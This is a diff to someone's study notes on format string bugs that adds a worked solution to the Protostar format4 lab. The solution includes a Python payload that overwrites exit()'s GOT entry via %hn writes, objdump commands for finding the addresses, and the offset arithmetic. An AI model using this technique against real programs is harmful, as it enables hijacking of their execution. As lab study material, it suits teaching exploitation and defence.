@@ -169,8 +169,39 @@
        >  There is the ‘%n’parameter, which writes the number of bytes already printed, into a variable of our choice. The address of the 			variable is given to the format function by placing an integer pointer as parameter onto the stack.
 
 	>  ‘%s’ displays memory from an address that is supplied on the stack. 
+	
+	**Protostar format4 solution
+	
+		python -c 'print "\x24\x97\x04\x08\x26\x97\x04\x08"+"%2044x%5$hn%31920x%4$hn"' | ./format4
+		
+		exit() is a libc function and when the program runs its address is stored in the Global Offset Table(GOT) for 			later use. Format string vulnerability can be used to write the function hello() address into the GOT where the 		exit() function's address is stored. When the program calls exit() it will look in the GOT for its address and 			execution will be redirected to our hello() function instead.
+		
+		Find out addresses of exit and hello function
+		
+		objdump -t format4 | grep "hello"
+		objdump -R format4 | grep "exit"
+		
+		exit -- > 08049724 ---> \x24\x97\x04\x08
 
+		hello --> 080484b4  ---> \xb4\x84\x04\x08
+		
+		%5$hn  --> 
+			5$ is used to point to the exact position on the stack. Here we're poiting to the 5th position
+			%hn is for the short write that is writing 16 bits or 2 bytes   
+			
+		Due to little endian scheme, b4 needs to be written in the memory on the first byte , 84 on the second byte, 
+		04 on third and 08 on fourth. (080484b4).
+		
+		1. As 0804 in hex = 2052 in dec, 8 bytes of address is already prepended in the input, so 2052-8 = 2044 is      			written on the third memory location pointed by \x26\x97\x04\x08    
+		
+		2. Since 84b4 in hex = 33972 in dec, thus writing 33972 - 2052 = 31920 on the first memory unit pointed by
+			\x24\x97\x04\x08
+		
+		
+			
 ## Resources
 https://github.com/FabioBaroni/awesome-exploit-development/blob/master/README.md
 
 https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf
+
+http://the2702.com/2015/06/17/Format-4.html
